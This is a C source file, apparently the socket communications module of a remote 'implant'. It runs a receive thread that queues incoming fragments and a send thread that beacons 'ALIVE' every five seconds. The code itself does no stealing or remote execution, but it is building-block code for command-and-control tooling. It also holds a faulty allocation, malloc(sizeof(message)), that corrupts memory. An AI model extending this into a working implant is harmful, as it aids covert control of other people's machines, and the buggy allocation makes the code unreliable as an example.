#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

#include <sys/socket.h>

#include "implant.h"
#include "queue.h"
#include "agent_comms.h"

// Global variables
// Receive Queue
extern struct Queue* receive_queue;
extern pthread_mutex_t receive_queue_lock;
// Send Queue
extern struct Queue* send_queue;
extern pthread_mutex_t send_queue_lock;

void *agent_receive(void *vargp){
	int *sockfd = (int*)vargp;
	Fragment fragment;
	char* buffer;
	
	for (;;){
		uint message_size = 0;
		uint bytes_received = 0;
		
		// get first chunk which contains total message size
		int nbytes = recv(*sockfd, (void*)&fragment, sizeof(Fragment), 0);
		if (nbytes <= 0){
			(nbytes == 0) ? printf("connection closed\n") : printf("recv error\n");
			exit(-1);
		}
		
		Queue_Message* message = malloc(sizeof(message));
		message->fragment = malloc(nbytes);
		message->id = -1;
		message->fragment_size = nbytes;
		memset(message->fragment, 0, nbytes);
		memcpy(message->fragment, &fragment, nbytes);
		
		pthread_mutex_lock(&receive_queue_lock);
		enqueue(receive_queue, message);
		pthread_mutex_unlock(&receive_queue_lock);
	}
	return 0;	
}

void *agent_send(void *vargp){
	char *alive = "ALIVE\n";
	int *sockfd = (int*)vargp;
	uint message_size = 0;
	char buf[BUFFERSIZE];
	
	Fragment fragment;
	
	fragment.type = 0;
	fragment.index = 0;
	// set first 4 bytes of message to message size
	fragment.payload[0] = ((int)strlen(alive) >> 24) & 0xFF;
	fragment.payload[1] = ((int)strlen(alive) >> 16) & 0xFF;
	fragment.payload[2] = ((int)strlen(alive) >> 8) & 0xFF;
	fragment.payload[3] = (int)strlen(alive) & 0xFF;
	memcpy(fragment.payload + 4, alive, strlen(alive));
	
	// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + "ALIVE\n"
	message_size = sizeof(fragment.type) + sizeof(fragment.index) + 4 + strlen(alive);
	
	for (;;){
		printf("DEBUG sending fragment:\ttype: %d, index: %d, size: %d bytes\n", fragment.type, fragment.index, message_size);
		send(*sockfd, &fragment, message_size, 0);
		sleep(5);
	}
	return 0;	
}